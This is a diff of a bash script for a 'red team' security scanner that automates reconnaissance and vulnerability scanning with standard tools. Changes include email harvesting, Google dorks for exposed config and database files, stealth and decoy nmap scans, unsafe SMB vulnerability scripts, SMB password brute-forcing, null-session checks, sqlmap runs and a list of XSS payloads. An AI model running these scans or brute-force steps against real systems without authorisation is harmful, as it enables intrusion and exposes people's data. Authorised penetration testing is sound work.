@@ -1,7 +1,7 @@
 #!/bin/bash
 set -euo pipefail
 
-# Couleurs
+# Couleurs modernes et professionnelles
 RED='\033[0;31m'
 GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
@@ -10,9 +10,28 @@ MAGENTA='\033[0;35m'
 CYAN='\033[0;36m'
 WHITE='\033[1;37m'
 GRAY='\033[0;90m'
+BOLD='\033[1m'
+DIM='\033[2m'
+UNDERLINE='\033[4m'
+BLINK='\033[5m'
+REVERSE='\033[7m'
+BRIGHT_RED='\033[1;31m'
+BRIGHT_GREEN='\033[1;32m'
+BRIGHT_YELLOW='\033[1;33m'
+BRIGHT_BLUE='\033[1;34m'
+BRIGHT_MAGENTA='\033[1;35m'
+BRIGHT_CYAN='\033[1;36m'
+BRIGHT_WHITE='\033[1;37m'
+BG_RED='\033[41m'
+BG_GREEN='\033[42m'
+BG_YELLOW='\033[43m'
+BG_BLUE='\033[44m'
+BG_MAGENTA='\033[45m'
+BG_CYAN='\033[46m'
+BG_WHITE='\033[47m'
 NC='\033[0m'
 
-VERSION="2.1.1"
+VERSION="2.2.1"
 
 # Variables globales pour gestion interruption
 SCAN_INTERRUPTED=false
@@ -20,27 +39,34 @@ CURRENT_SCAN=""
 
 display_banner() {
     clear
-    echo -e "${RED}"
+    echo -e "${BRIGHT_CYAN}"
     cat << "EOF"
-    ███████╗███████╗ ██████╗██╗   ██╗██████╗ ██╗████████╗██╗   ██╗
-    ██╔════╝██╔════╝██╔════╝██║   ██║██╔══██╗██║╚══██╔══╝╚██╗ ██╔╝
-    ███████╗█████╗  ██║     ██║   ██║██████╔╝██║   ██║    ╚████╔╝ 
-    ╚════██║██╔══╝  ██║     ██║   ██║██╔══██╗██║   ██║     ╚██╔╝  
-    ███████║███████╗╚██████╗╚██████╔╝██║  ██║██║   ██║      ██║   
-    ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝   ╚═╝      ╚═╝   
-                                                                   
-    ███████╗ ██████╗ █████╗ ███╗   ██╗███╗   ██╗███████╗██████╗ 
-    ██╔════╝██╔════╝██╔══██╗████╗  ██║████╗  ██║██╔════╝██╔══██╗
-    ███████╗██║     ███████║██╔██╗ ██║██╔██╗ ██║█████╗  ██████╔╝
-    ╚════██║██║     ██╔══██║██║╚██╗██║██║╚██╗██║██╔══╝  ██╔══██╗
-    ███████║╚██████╗██║  ██║██║ ╚████║██║ ╚████║███████╗██║  ██║
-    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
+╔══════════════════════════════════════════════════════════════════════════════╗
+║  ███████╗███████╗ ██████╗██╗   ██╗██████╗ ██╗████████╗██╗   ██╗             ║
+║  ██╔════╝██╔════╝██╔════╝██║   ██║██╔══██╗██║╚══██╔══╝╚██╗ ██╔╝             ║
+║  ███████╗█████╗  ██║     ██║   ██║██████╔╝██║   ██║    ╚████╔╝              ║
+║  ╚════██║██╔══╝  ██║     ██║   ██║██╔══██╗██║   ██║     ╚██╔╝               ║
+║  ███████║███████╗╚██████╗╚██████╔╝██║  ██║██║   ██║      ██║                ║
+║  ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝   ╚═╝      ╚═╝                ║
+║                                                                              ║
+║  ███████╗ ██████╗ █████╗ ███╗   ██╗███╗   ██╗███████╗██████╗               ║
+║  ██╔════╝██╔════╝██╔══██╗████╗  ██║████╗  ██║██╔════╝██╔══██╗              ║
+║  ███████╗██║     ███████║██╔██╗ ██║██╔██╗ ██║█████╗  ██████╔╝              ║
+║  ╚════██║██║     ██╔══██║██║╚██╗██║██║╚██╗██║██╔══╝  ██╔══██╗              ║
+║  ███████║╚██████╗██║  ██║██║ ╚████║██║ ╚████║███████╗██║  ██║              ║
+║  ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝              ║
+╚══════════════════════════════════════════════════════════════════════════════╝
 EOF
     echo -e "${NC}"
-    echo -e "${GRAY}════════════════════════════════════════════════════════════════${NC}"
-    echo -e "${WHITE}              Advanced Red Team Security Assessment Tool${NC}"
-    echo -e "${CYAN}                    Version ${VERSION} | by mpgamer75${NC}"
-    echo -e "${GRAY}════════════════════════════════════════════════════════════════${NC}"
+    echo -e "${BOLD}${BG_BLUE}${WHITE}                                                                              ${NC}"
+    echo -e "${BOLD}${BG_BLUE}${WHITE}                ADVANCED RED TEAM SECURITY ASSESSMENT TOOL                ${NC}"
+    echo -e "${BOLD}${BG_BLUE}${WHITE}                                                                              ${NC}"
+    echo -e "${NC}"
+    echo -e "${BRIGHT_WHITE}┌─────────────────────────────────────────────────────────────────────────────┐${NC}"
+    echo -e "${BRIGHT_WHITE}│${NC} ${BRIGHT_CYAN}Version:${NC} ${BRIGHT_YELLOW}${VERSION}${NC} ${BRIGHT_WHITE}│${NC} ${BRIGHT_CYAN}Author:${NC} ${BRIGHT_GREEN}mpgamer75${NC} ${BRIGHT_WHITE}│${NC} ${BRIGHT_CYAN}Mode:${NC} ${BRIGHT_MAGENTA}Professional${NC} ${BRIGHT_WHITE}│${NC}"
+    echo -e "${BRIGHT_WHITE}└─────────────────────────────────────────────────────────────────────────────┘${NC}"
+    echo -e "${DIM}${GRAY}                        Ethical Hacking & Penetration Testing${NC}"
+    echo
 }
 
 show_help() {
@@ -107,21 +133,21 @@ EXAMPLES:
 EOF
 }
 
-# Gestion améliorée des interruptions
+# Enhanced interruption handling
 handle_interrupt() {
     SCAN_INTERRUPTED=true
-    echo -e "\n${YELLOW}[!]${NC} Interruption détectée..."
+    echo -e "\n${YELLOW}[!]${NC} Interruption detected..."
     
     if [ -n "$CURRENT_SCAN" ]; then
-        echo -e "${CYAN}[INFO]${NC} Arrêt en cours de: $CURRENT_SCAN"
-        # Tuer les processus en arrière-plan
+        echo -e "${CYAN}[INFO]${NC} Stopping current scan: $CURRENT_SCAN"
+        # Kill background processes
         jobs -p | xargs -r kill 2>/dev/null || true
     fi
     
-    echo -e "${YELLOW}[INFO]${NC} Génération du rapport partiel..."
+    echo -e "${YELLOW}[INFO]${NC} Generating partial report..."
     generate_clean_report
-    echo -e "\n${CYAN}[INFO]${NC} Résultats partiels sauvegardés dans: ${WHITE}$OUTDIR${NC}"
-    echo -e "${YELLOW}Scan interrompu par l'utilisateur${NC}"
+    echo -e "\n${CYAN}[INFO]${NC} Partial results saved in: ${WHITE}$OUTDIR${NC}"
+    echo -e "${YELLOW}Scan interrupted by user${NC}"
     exit 130
 }
 
@@ -136,7 +162,7 @@ STEALTH_MODE=false
 prepare_output() {
     OUTDIR="redteam_assessment_$(date +'%Y%m%d_%H%M%S')"
     mkdir -p "$OUTDIR"/{osint,network,web,vulnerabilities,reports,exploitation}
-    echo -e "${GREEN}[INFO]${NC} Répertoire de résultats: ${WHITE}$OUTDIR${NC}"
+    echo -e "${GREEN}[INFO]${NC} Results directory: ${WHITE}$OUTDIR${NC}"
 }
 
 # Fonction améliorée d'exécution avec indicateur de progression
@@ -155,7 +181,7 @@ execute_with_progress() {
         (
             local elapsed=0
             while [ $elapsed -lt $timeout_duration ] && kill -0 $$ 2>/dev/null; do
-                printf "\r${YELLOW}[%02d:%02d]${NC} $name en cours..." $((elapsed/60)) $((elapsed%60))
+                printf "\r${YELLOW}[%02d:%02d]${NC} $name in progress..." $((elapsed/60)) $((elapsed%60))
                 sleep 5
                 elapsed=$((elapsed + 5))
             done
@@ -203,40 +229,65 @@ execute_with_progress() {
         0) return 0 ;;
         130) return 130 ;;
         *) 
-            echo -e "${YELLOW}[WARNING]${NC} $name terminé avec des erreurs (code: $exit_code)"
+            echo -e "${YELLOW}[WARNING]${NC} $name completed with errors (code: $exit_code)"
             return 0 
             ;;
     esac
 }
 
 show_scan_menu() {
-    echo -e "\n${YELLOW}Sélectionner le type d'évaluation:${NC}"
-    echo -e "${CYAN}1)${NC} OSINT & Collecte d'informations"
-    echo -e "${CYAN}2)${NC} Reconnaissance réseau & énumération" 
-    echo -e "${CYAN}3)${NC} Test de sécurité d'applications web"
-    echo -e "${CYAN}4)${NC} Évaluation Red Team complète"
+    echo -e "\n${BRIGHT_WHITE}╔══════════════════════════════════════════════════════════════════════════════╗${NC}"
+    echo -e "${BRIGHT_WHITE}║${NC}                          ${BRIGHT_CYAN}ASSESSMENT TYPE SELECTION${NC}                          ${BRIGHT_WHITE}║${NC}"
+    echo -e "${BRIGHT_WHITE}╚══════════════════════════════════════════════════════════════════════════════╝${NC}"
+    echo
+    echo -e "${BRIGHT_WHITE}┌─────────────────────────────────────────────────────────────────────────────┐${NC}"
+    echo -e "${BRIGHT_WHITE}│${NC} ${BRIGHT_CYAN}1)${NC} ${BRIGHT_GREEN}OSINT & Information Gathering${NC}                                    ${BRIGHT_WHITE}│${NC}"
+    echo -e "${BRIGHT_WHITE}│${NC}    ${DIM}${GRAY}• Passive reconnaissance and public data collection${NC}             ${BRIGHT_WHITE}│${NC}"
+    echo -e "${BRIGHT_WHITE}│${NC}    ${DIM}${GRAY}• Subdomain enumeration and email harvesting${NC}                    ${BRIGHT_WHITE}│${NC}"
+    echo -e "${BRIGHT_WHITE}│${NC}    ${DIM}${GRAY}• Certificate analysis and DNS enumeration${NC}                      ${BRIGHT_WHITE}│${NC}"
+    echo -e "${BRIGHT_WHITE}├─────────────────────────────────────────────────────────────────────────────┤${NC}"
+    echo -e "${BRIGHT_WHITE}│${NC} ${BRIGHT_CYAN}2)${NC} ${BRIGHT_YELLOW}Network Reconnaissance & Enumeration${NC}                             ${BRIGHT_WHITE}│${NC}"
+    echo -e "${BRIGHT_WHITE}│${NC}    ${DIM}${GRAY}• Port scanning and service detection${NC}                           ${BRIGHT_WHITE}│${NC}"
+    echo -e "${BRIGHT_WHITE}│${NC}    ${DIM}${GRAY}• SMB, SNMP and protocol enumeration${NC}                            ${BRIGHT_WHITE}│${NC}"
+    echo -e "${BRIGHT_WHITE}│${NC}    ${DIM}${GRAY}• Network vulnerability detection${NC}                               ${BRIGHT_WHITE}│${NC}"
+    echo -e "${BRIGHT_WHITE}├─────────────────────────────────────────────────────────────────────────────┤${NC}"
+    echo -e "${BRIGHT_WHITE}│${NC} ${BRIGHT_CYAN}3)${NC} ${BRIGHT_MAGENTA}Web Application Security Testing${NC}                                 ${BRIGHT_WHITE}│${NC}"
+    echo -e "${BRIGHT_WHITE}│${NC}    ${DIM}${GRAY}• Directory and file enumeration${NC}                                ${BRIGHT_WHITE}│${NC}"
+    echo -e "${BRIGHT_WHITE}│${NC}    ${DIM}${GRAY}• SQL injection and XSS testing${NC}                                 ${BRIGHT_WHITE}│${NC}"
+    echo -e "${BRIGHT_WHITE}│${NC}    ${DIM}${GRAY}• SSL/TLS analysis and WAF detection${NC}                            ${BRIGHT_WHITE}│${NC}"
+    echo -e "${BRIGHT_WHITE}├─────────────────────────────────────────────────────────────────────────────┤${NC}"
+    echo -e "${BRIGHT_WHITE}│${NC} ${BRIGHT_CYAN}4)${NC} ${BRIGHT_RED}Complete Red Team Assessment${NC}                                     ${BRIGHT_WHITE}│${NC}"
+    echo -e "${BRIGHT_WHITE}│${NC}    ${DIM}${GRAY}• Combination of all modules above${NC}                              ${BRIGHT_WHITE}│${NC}"
+    echo -e "${BRIGHT_WHITE}│${NC}    ${DIM}${GRAY}• Automated attack script generation${NC}                            ${BRIGHT_WHITE}│${NC}"
+    echo -e "${BRIGHT_WHITE}│${NC}    ${DIM}${GRAY}• Exploitation preparation and persistence${NC}                      ${BRIGHT_WHITE}│${NC}"
+    echo -e "${BRIGHT_WHITE}└─────────────────────────────────────────────────────────────────────────────┘${NC}"
     echo
     
+    # Active modes display
+    if [ "$QUICK_MODE" = true ] || [ "$STEALTH_MODE" = true ]; then
+        echo -e "${BRIGHT_WHITE}┌─────────────────────────────────────────────────────────────────────────────┐${NC}"
+        echo -e "${BRIGHT_WHITE}│${NC}                               ${BRIGHT_YELLOW}ACTIVE MODES${NC}                                ${BRIGHT_WHITE}│${NC}"
     if [ "$QUICK_MODE" = true ]; then
-        echo -e "${YELLOW}[MODE]${NC} Mode rapide activé - scans optimisés pour la vitesse"
+            echo -e "${BRIGHT_WHITE}│${NC} ${BRIGHT_GREEN}*${NC} ${BRIGHT_YELLOW}Quick Mode:${NC} Speed-optimized scans                                  ${BRIGHT_WHITE}│${NC}"
     fi
-    
     if [ "$STEALTH_MODE" = true ]; then
-        echo -e "${YELLOW}[MODE]${NC} Mode furtif activé - techniques d'évasion"
+            echo -e "${BRIGHT_WHITE}│${NC} ${BRIGHT_BLUE}*${NC} ${BRIGHT_YELLOW}Stealth Mode:${NC} Evasion techniques and discrete scans               ${BRIGHT_WHITE}│${NC}"
     fi
+        echo -e "${BRIGHT_WHITE}└─────────────────────────────────────────────────────────────────────────────┘${NC}"
     echo
+    fi
 }
 
 run_osint_scans() {
     local target="$1"
     local domain="$2"
     
-    echo -e "\n${RED}[OSINT]${NC} Démarrage de la collecte d'informations..."
+    echo -e "\n${RED}[OSINT]${NC} Starting information gathering..."
     
     if [ -n "$domain" ]; then
         execute_with_progress "WHOIS Lookup" "whois '$domain'" 60 "$OUTDIR/osint/whois.txt"
         
-        # DNS enumeration améliorée
+        # Enhanced DNS enumeration
         execute_with_progress "DNS Enumeration" "
             echo '=== A Records ===' 
             dig +short '$domain' A
@@ -252,18 +303,37 @@ run_osint_scans() {
             dig +short '$domain' CNAME
         " 60 "$OUTDIR/osint/dns_enum.txt"
         
-        # Subdomain enumeration avancée
+        # Advanced and comprehensive subdomain enumeration
         if command -v subfinder &> /dev/null; then
-            execute_with_progress "Subfinder Discovery" "subfinder -d '$domain' -all -recursive -silent" 300 "$OUTDIR/osint/subdomains_subfinder.txt"
+            execute_with_progress "Subfinder Discovery" "subfinder -d '$domain' -all -recursive -silent -o '$OUTDIR/osint/subdomains_subfinder.txt'" 300 "$OUTDIR/osint/subdomains_subfinder.txt"
         fi
         
         if command -v amass &> /dev/null; then
             local amass_timeout=600
             [ "$QUICK_MODE" = true ] && amass_timeout=300
-            execute_with_progress "Amass Enumeration" "amass enum -passive -d '$domain' -silent" $amass_timeout "$OUTDIR/osint/subdomains_amass.txt"
+            execute_with_progress "Amass Enumeration" "amass enum -passive -d '$domain' -silent -o '$OUTDIR/osint/subdomains_amass.txt'" $amass_timeout "$OUTDIR/osint/subdomains_amass.txt"
         fi
         
-        # Certificate transparency (avec vérification jq)
+        # Assetfinder for subdomain discovery
+        if command -v assetfinder &> /dev/null; then
+            execute_with_progress "Assetfinder Discovery" "assetfinder --subs-only '$domain'" 180 "$OUTDIR/osint/subdomains_assetfinder.txt"
+        fi
+        
+        # Findomain for rapid discovery
+        if command -v findomain &> /dev/null; then
+            execute_with_progress "Findomain Discovery" "findomain -t '$domain' -q" 120 "$OUTDIR/osint/subdomains_findomain.txt"
+        fi
+        
+        # Subdomain consolidation
+        execute_with_progress "Subdomain Consolidation" "
+            echo '=== Consolidated Subdomains ==='
+            cat '$OUTDIR/osint/subdomains_'*.txt 2>/dev/null | sort -u | grep -v '^$' > '$OUTDIR/osint/all_subdomains.txt' || echo 'No subdomains found'
+            echo 'Total unique subdomains found: \$(cat '$OUTDIR/osint/all_subdomains.txt' | wc -l)'
+            echo -e '\n=== Top 10 Subdomains ==='
+            head -10 '$OUTDIR/osint/all_subdomains.txt' 2>/dev/null || echo 'No subdomains to display'
+        " 60 "$OUTDIR/osint/subdomain_summary.txt"
+        
+        # Certificate transparency (with jq verification)
         if command -v jq &> /dev/null; then
             execute_with_progress "Certificate Transparency" "
                 curl -s 'https://crt.sh/?q=%.$domain&output=json' | jq -r '.[].name_value' 2>/dev/null | sed 's/\\*\\.//g' | sort -u || echo 'No certificate data found'
@@ -274,21 +344,89 @@ run_osint_scans() {
             " 60 "$OUTDIR/osint/crt_sh.txt"
         fi
         
-        # Email harvesting
-        if command -v theharvester &> /dev/null; then
-            execute_with_progress "Email Harvesting" "theharvester -d '$domain' -l 200 -b google,bing,yahoo,duckduckgo" 300 "$OUTDIR/osint/emails.txt"
+        # Email harvesting - theHarvester correction
+        if command -v theHarvester &> /dev/null; then
+            execute_with_progress "Email Harvesting" "theHarvester -d '$domain' -l 200 -b google,bing,yahoo,duckduckgo,hunter,baidu,linkedin" 300 "$OUTDIR/osint/emails.txt"
+        elif command -v theharvester &> /dev/null; then
+            # Fallback for legacy version
+            execute_with_progress "Email Harvesting (Legacy)" "theharvester -d '$domain' -l 200 -b google,bing,yahoo,duckduckgo" 300 "$OUTDIR/osint/emails.txt"
         fi
         
-        # Google dorking automation
+        # Advanced Google dorking automation
         execute_with_progress "Google Dorking" "
+            echo '=== Document Discovery ==='
             echo \"site:$domain filetype:pdf\"
             echo \"site:$domain filetype:doc\"
+            echo \"site:$domain filetype:docx\"
             echo \"site:$domain filetype:xls\"
+            echo \"site:$domain filetype:xlsx\"
+            echo \"site:$domain filetype:ppt\"
+            echo \"site:$domain filetype:pptx\"
+            echo \"site:$domain filetype:txt\"
+            echo -e '\n=== Admin Panels & Login Pages ==='
             echo \"site:$domain inurl:admin\"
+            echo \"site:$domain inurl:administrator\"
             echo \"site:$domain inurl:login\"
+            echo \"site:$domain inurl:signin\"
+            echo \"site:$domain inurl:auth\"
+            echo \"site:$domain inurl:dashboard\"
+            echo \"site:$domain inurl:panel\"
+            echo -e '\n=== Configuration & Sensitive Files ==='
             echo \"site:$domain inurl:config\"
-            echo \"site:$domain intitle:index of\"
+            echo \"site:$domain inurl:backup\"
+            echo \"site:$domain inurl:database\"
+            echo \"site:$domain inurl:db\"
+            echo \"site:$domain inurl:sql\"
+            echo \"site:$domain filetype:sql\"
+            echo \"site:$domain filetype:env\"
+            echo \"site:$domain filetype:log\"
+            echo -e '\n=== Directory Listings ==='
+            echo \"site:$domain intitle:'index of'\"
+            echo \"site:$domain intitle:'directory listing'\"
+            echo -e '\n=== Error Pages & Debug Info ==='
+            echo \"site:$domain intext:'error'\"
+            echo \"site:$domain intext:'warning'\"
+            echo \"site:$domain intext:'debug'\"
+            echo \"site:$domain intext:'stack trace'\"
+            echo -e '\n=== API & Development ==='
+            echo \"site:$domain inurl:api\"
+            echo \"site:$domain inurl:v1\"
+            echo \"site:$domain inurl:v2\"
+            echo \"site:$domain inurl:rest\"
+            echo \"site:$domain inurl:graphql\"
+            echo \"site:$domain inurl:swagger\"
         " 30 "$OUTDIR/osint/google_dorks.txt"
+        
+        # Shodan integration if available
+        if command -v shodan &> /dev/null; then
+            execute_with_progress "Shodan Search" "
+                echo '=== Shodan Domain Search ==='
+                shodan domain '$domain' 2>/dev/null || echo 'Shodan search failed - API key required'
+                echo -e '\n=== Shodan Host Search ==='
+                shodan search 'hostname:$domain' --limit 10 2>/dev/null || echo 'Shodan host search failed'
+            " 120 "$OUTDIR/osint/shodan.txt"
+        fi
+        
+        # Wayback Machine URLs
+        execute_with_progress "Wayback Machine URLs" "
+            echo '=== Wayback Machine Historical URLs ==='
+            curl -s 'http://web.archive.org/cdx/search/cdx?url=*.$domain/*&output=text&fl=original&collapse=urlkey' | head -100 || echo 'Wayback Machine search failed'
+        " 60 "$OUTDIR/osint/wayback_urls.txt"
+        
+        # Social media reconnaissance
+        execute_with_progress "Social Media Recon" "
+            echo '=== Social Media Profiles ==='
+            echo 'LinkedIn: https://www.linkedin.com/company/$domain'
+            echo 'Twitter: https://twitter.com/search?q=$domain'
+            echo 'Facebook: https://www.facebook.com/search/top?q=$domain'
+            echo 'Instagram: https://www.instagram.com/explore/tags/$domain'
+            echo 'YouTube: https://www.youtube.com/results?search_query=$domain'
+            echo 'GitHub: https://github.com/search?q=$domain'
+            echo -e '\n=== Breach Data Sources ==='
+            echo 'HaveIBeenPwned: Check emails found for breaches'
+            echo 'DeHashed: Commercial breach data search'
+            echo 'IntelligenceX: OSINT search engine'
+        " 30 "$OUTDIR/osint/social_media.txt"
     fi
     
     if [ -n "$target" ]; then
@@ -296,77 +434,92 @@ run_osint_scans() {
         execute_with_progress "IP Geolocation" "curl -s 'http://ip-api.com/json/$target' || echo 'Geolocation failed'" 30 "$OUTDIR/osint/geolocation.txt"
     fi
     
-    echo -e "${GREEN}[COMPLETED]${NC} Collecte OSINT terminée"
+    echo -e "${GREEN}[COMPLETED]${NC} OSINT collection completed"
 }
 
 run_network_scans() {
     local target="$1"
     
-    echo -e "\n${RED}[NETWORK]${NC} Démarrage de la reconnaissance réseau..."
+    echo -e "\n${RED}[NETWORK]${NC} Starting network reconnaissance..."
     
-    # Host discovery amélioré avec -Pn pour éviter les blocages
+    # Enhanced host discovery with -Pn to avoid blocking
     execute_with_progress "Host Discovery" "nmap -sn -Pn -PE -PP -PS21,22,23,25,53,80,113,443,993,995 '$target'" 60 "$OUTDIR/network/host_discovery.txt"
     
-    # Port scanning adaptatif selon le mode - TOUS avec -Pn
+    # Adaptive port scanning by mode - ALL with -Pn
     if [ "$QUICK_MODE" = true ]; then
-        # Mode rapide - top 1000 ports seulement
+        # Quick mode - top 1000 ports only
         execute_with_progress "Quick Port Scan" "nmap -Pn -T5 --top-ports 1000 --min-rate=5000 '$target'" 180 "$OUTDIR/network/nmap_quick.txt"
         
-        # Rustscan si disponible (plus rapide)
+        # Rustscan if available (faster)
         if command -v rustscan &> /dev/null; then
             execute_with_progress "RustScan Ultra-Fast" "rustscan -a '$target' --top" 120 "$OUTDIR/network/rustscan.txt"
         fi
     elif [ "$STEALTH_MODE" = true ]; then
-        # Mode furtif - scans lents et évasifs
+        # Stealth mode - slow and evasive scans
         execute_with_progress "Stealth SYN Scan" "nmap -Pn -sS -T2 -f --mtu 24 --scan-delay 5s --top-ports 1000 '$target'" 1800 "$OUTDIR/network/nmap_stealth.txt"
         execute_with_progress "Decoy Scan" "nmap -Pn -sS -T2 -D RND:10 --top-ports 500 '$target'" 1200 "$OUTDIR/network/nmap_decoy.txt"
     else
-        # Mode standard optimisé - AVEC -Pn obligatoire
+        # Optimized standard mode - WITH mandatory -Pn
         execute_with_progress "Standard Port Scan" "nmap -Pn -sS -T4 --top-ports 3000 --min-rate=1000 '$target'" 600 "$OUTDIR/network/nmap_standard.txt"
         
-        # Service detection sur les ports ouverts seulement - AVEC -Pn
+        # Service detection on open ports only - WITH -Pn
         execute_with_progress "Service Detection" "nmap -Pn -sV -sC --version-intensity 5 --top-ports 1000 '$target'" 900 "$OUTDIR/network/nmap_services.txt"
     fi
     
-    # UDP scan critique seulement (optimisé) - AVEC -Pn
+    # Critical UDP scan only (optimized) - WITH -Pn
     execute_with_progress "UDP Critical Ports" "nmap -Pn -sU --top-ports 20 '$target'" 300 "$OUTDIR/network/nmap_udp_critical.txt"
     
-    # OS detection léger - AVEC -Pn
+    # Lightweight OS detection - WITH -Pn
     execute_with_progress "OS Fingerprinting" "nmap -Pn -O --osscan-guess --max-os-tries 2 '$target'" 180 "$OUTDIR/network/nmap_os.txt"
     
-    # Scripts de vulnérabilités ciblés - VERSION AMÉLIORÉE
-    execute_with_progress "Vulnerability Scripts" "nmap -Pn --script vuln,safe,discovery --top-ports 1000 '$target'" 600 "$OUTDIR/network/nmap_vulns.txt"
+    # Targeted vulnerability scripts - OPTIMIZED VERSION 2024
+    execute_with_progress "Vulnerability Scripts" "nmap -Pn --script 'vuln and not dos and not intrusive' --script-args vulns.showall --top-ports 1000 '$target'" 600 "$OUTDIR/network/nmap_vulns.txt"
     
-    # Script vulners moderne si disponible
+    # Specific critical vulnerability scripts
+    execute_with_progress "Critical Vulnerability Scan" "nmap -Pn --script 'smb-vuln-*,ssl-*,http-vuln-*' --script-args unsafe=1 '$target'" 400 "$OUTDIR/network/nmap_critical_vulns.txt"
+    
+    # Modern vulners script if available
     if nmap --script-help vulners 2>/dev/null | grep -q vulners; then
         execute_with_progress "Vulners Database Scan" "nmap -Pn -sV --script vulners --script-args mincvss=5.0 '$target'" 300 "$OUTDIR/network/nmap_vulners.txt"
     fi
     
-    # Vulscan si disponible
+    # Vulscan if available
     if [ -f "/usr/share/nmap/scripts/vulscan/vulscan.nse" ] || [ -f "/usr/local/share/nmap/scripts/vulscan/vulscan.nse" ]; then
         execute_with_progress "Vulscan Database" "nmap -Pn -sV --script vulscan/vulscan.nse '$target'" 400 "$OUTDIR/network/nmap_vulscan.txt"
     fi
     
-    # SMB enumeration si applicable - AVEC -Pn
+    # Complete and optimized SMB enumeration - WITH -Pn
     execute_with_progress "SMB Enumeration" "
-        nmap -Pn -p 445 --script smb-enum-shares,smb-enum-users,smb-os-discovery,smb-vuln-* '$target'
+        echo '=== SMB Version Detection ==='
+        nmap -Pn -p 139,445 --script smb-protocols,smb-security-mode,smb-os-discovery '$target'
+        echo -e '\n=== SMB Shares Enumeration ==='
+        nmap -Pn -p 445 --script smb-enum-shares,smb-enum-domains,smb-enum-groups,smb-enum-users '$target'
+        echo -e '\n=== SMB Vulnerability Scan ==='
+        nmap -Pn -p 445 --script smb-vuln-ms17-010,smb-vuln-ms08-067,smb-vuln-conficker,smb-vuln-cve2009-3103,smb-vuln-ms06-025,smb-vuln-ms07-029,smb-vuln-ms10-054,smb-vuln-ms10-061,smb-vuln-regsvc-dos,smb-vuln-webexec '$target'
+        echo -e '\n=== SMB Brute Force Protection Check ==='
+        nmap -Pn -p 445 --script smb-brute --script-args userdb=users.txt,passdb=passwords.txt,unpwdb.timelimit=30s '$target' 2>/dev/null || echo 'SMB brute force check skipped'
         if command -v enum4linux &> /dev/null; then
-            enum4linux -a '$target' 2>/dev/null || echo 'enum4linux not available or failed'
+            echo -e '\n=== Enum4linux Results ==='
+            timeout 120 enum4linux -a '$target' 2>/dev/null || echo 'enum4linux timeout or failed'
         fi
-    " 300 "$OUTDIR/network/smb_enum.txt"
+        if command -v smbclient &> /dev/null; then
+            echo -e '\n=== SMB Client Null Session Test ==='
+            timeout 30 smbclient -L '$target' -N 2>/dev/null || echo 'SMB null session failed'
+        fi
+    " 400 "$OUTDIR/network/smb_enum.txt"
     
     # SNMP enumeration - AVEC -Pn
     execute_with_progress "SNMP Enumeration" "nmap -Pn -sU -p 161 --script snmp-sysdescr,snmp-processes,snmp-netstat '$target'" 180 "$OUTDIR/network/snmp_enum.txt"
     
-    echo -e "${GREEN}[COMPLETED]${NC} Reconnaissance réseau terminée"
+    echo -e "${GREEN}[COMPLETED]${NC} Network reconnaissance completed"
 }
 
 run_web_scans() {
     local url="$1"
     
-    echo -e "\n${RED}[WEB]${NC} Démarrage des tests d'applications web..."
+    echo -e "\n${RED}[WEB]${NC} Starting web application testing..."
     
-    # Technology detection améliorée
+    # Enhanced technology detection
     if command -v whatweb &> /dev/null; then
         execute_with_progress "Technology Detection" "whatweb '$url' -a 3 -v" 120 "$OUTDIR/web/whatweb.txt"
     fi
@@ -376,7 +529,7 @@ run_web_scans() {
         execute_with_progress "WAF Detection" "wafw00f '$url'" 60 "$OUTDIR/web/wafw00f.txt"
     fi
     
-    # SSL/TLS analysis améliorée
+    # Enhanced SSL/TLS analysis
     execute_with_progress "SSL/TLS Analysis" "
         domain_from_url=\$(echo '$url' | sed 's|https\\?://||' | sed 's|/.*||')
         echo '=== SSL Certificate Info ==='
@@ -387,7 +540,7 @@ run_web_scans() {
         nmap -Pn --script ssl-heartbleed,ssl-poodle,ssl-ccs-injection \"\$domain_from_url\" 2>/dev/null || echo 'SSL vuln scan failed'
     " 180 "$OUTDIR/web/ssl_analysis.txt"
     
-    # Directory enumeration optimisée
+    # Optimized directory enumeration
     local wordlist_dir="/usr/share/wordlists/dirb"
     [ ! -d "$wordlist_dir" ] && wordlist_dir="$HOME/.local/share/wordlists/dirb"
     
@@ -400,7 +553,7 @@ run_web_scans() {
         fi
     fi
     
-    # Nuclei vulnerability scanning amélioré
+    # Enhanced Nuclei vulnerability scanning
     if command -v nuclei &> /dev/null; then
         if [ "$QUICK_MODE" = true ]; then
             execute_with_progress "Quick Vulnerability Scan" "nuclei -u '$url' -severity critical,high -silent" 300 "$OUTDIR/web/nuclei_quick.txt"
@@ -422,7 +575,7 @@ run_web_scans() {
         execute_with_progress "SQL Injection Testing" "sqlmap -u '$url' --batch --level=2 --risk=2 --output-dir='$OUTDIR/web/sqlmap' --threads=5" 600 "$OUTDIR/web/sqlmap/sqlmap.log"
     fi
     
-    # XSS testing avec diverses techniques
+    # XSS testing with various techniques
     execute_with_progress "XSS Detection" "
         echo '=== Basic XSS Payloads ==='
         echo '<script>alert(1)</script>'
@@ -438,42 +591,42 @@ run_web_scans() {
         echo '<iframe src=javascript:alert(1)>'
     " 30 "$OUTDIR/web/xss_payloads.txt"
     
-    echo -e "${GREEN}[COMPLETED]${NC} Tests d'applications web terminés"
+    echo -e "${GREEN}[COMPLETED]${NC} Web application testing completed"
 }
 
 run_exploitation_prep() {
     local target="$1"
     
-    echo -e "\n${RED}[EXPLOIT]${NC} Préparation à l'exploitation..."
+    echo -e "\n${RED}[EXPLOIT]${NC} Exploitation preparation..."
     
-    # Searchsploit integration améliorée
+    # Enhanced Searchsploit integration
     if command -v searchsploit &> /dev/null; then
         execute_with_progress "Exploit Database Search" "
-            # Recherche par services détectés
+            # Search by detected services
             if [ -f '$OUTDIR/network/nmap_services.txt' ]; then
-                echo '=== Exploits par services détectés ==='
+                echo '=== Exploits by detected services ==='
                 grep -oP '\\d+/tcp\\s+open\\s+\\K[^\\s]+' '$OUTDIR/network/nmap_services.txt' 2>/dev/null | while read service; do
-                    echo \"=== Exploits pour \$service ===\"
-                    searchsploit \"\$service\" 2>/dev/null | head -10 || echo \"Aucun exploit trouvé pour \$service\"
+                    echo \"=== Exploits for \$service ===\"
+                    searchsploit \"\$service\" 2>/dev/null | head -10 || echo \"No exploits found for \$service\"
                     echo
                 done
             else
